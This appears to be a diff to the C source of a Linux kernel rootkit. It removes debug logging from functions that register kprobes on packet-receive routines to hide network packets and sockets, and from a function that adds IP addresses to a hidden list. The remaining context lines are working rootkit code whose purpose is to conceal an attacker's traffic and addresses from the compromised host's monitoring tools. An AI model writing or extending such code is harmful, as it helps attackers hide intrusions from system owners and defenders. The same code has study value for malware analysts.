@@ -47,7 +47,6 @@ void
 hide_packets(void)
 {
     if (atomic_inc_return(&packet_rcv_install_count) == 1) {
-        DEBUG_INFO("___ HIDING PACKETS %d, %d\n", rootkit.hiding_packets, rootkit.hiding_sockets);
         p_rcv.pre_handler = g7_packet_rcv;
         p_rcv.post_handler = g7_post;
         p_rcv.fault_handler = g7_fault;
@@ -75,7 +74,6 @@ void
 unhide_packets(void)
 {
     if (atomic_dec_return(&packet_rcv_install_count) < 1) {
-        DEBUG_INFO("___ UNHIDING PACKETS %d, %d\n", rootkit.hiding_packets, rootkit.hiding_sockets);
         unregister_kprobe(&p_rcv);
         unregister_kprobe(&tp_rcv);
         unregister_kprobe(&p_rcv_spkt);
@@ -90,10 +88,6 @@ hide_ip(const char *ip)
     u8 ipv6[16];
 
     if (strstr(ip, ".") && in4_pton(ip, -1, ipv4, -1, NULL)) {
-        int test;
-        memcpy(&test, ipv4, 4);
-        DEBUG_INFO("val is %0X\n", test);
-
         if (!list_contains_ip(&hidden_ips, ipv4, v4)) {
             memcpy(ipv4 + 4, (ip_t){ 0 }, 12);
             add_ip_to_list(hidden_ips_tail, ipv4, v4);
